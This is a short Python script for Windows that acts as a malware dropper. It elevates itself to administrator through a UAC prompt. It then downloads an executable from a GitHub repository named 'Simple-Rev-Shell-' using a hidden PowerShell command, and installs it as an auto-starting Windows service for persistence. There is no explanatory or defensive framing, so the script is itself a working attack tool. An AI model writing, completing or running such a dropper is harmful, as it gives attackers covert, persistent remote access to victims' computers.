import subprocess, os, ctypes, sys

# Ai code (not dealing with windll bullshit) YET!
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()
#################################################

directory = r"C:\Program Files\Larp_Project"

pricetopay = rf"powershell -Command iwr https://raw.githubusercontent.com/larplimiter14/Simple-Rev-Shell-/refs/heads/main/SimpleRevShell/payload.exe -OutFile 'c:\program files\larp_project\Larp.exe'"

os.makedirs(directory, exist_ok=True)

subprocess.run(pricetopay, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(rf'sc create LarpProjectService binPath="c:\Program Files\Larp_Project\Larp.exe" start=Auto', creationflags=subprocess.CREATE_NO_WINDOW)

with open(rf"C:\Program Files\Larp_Project\test.txt", "w") as f:
    f.write("test")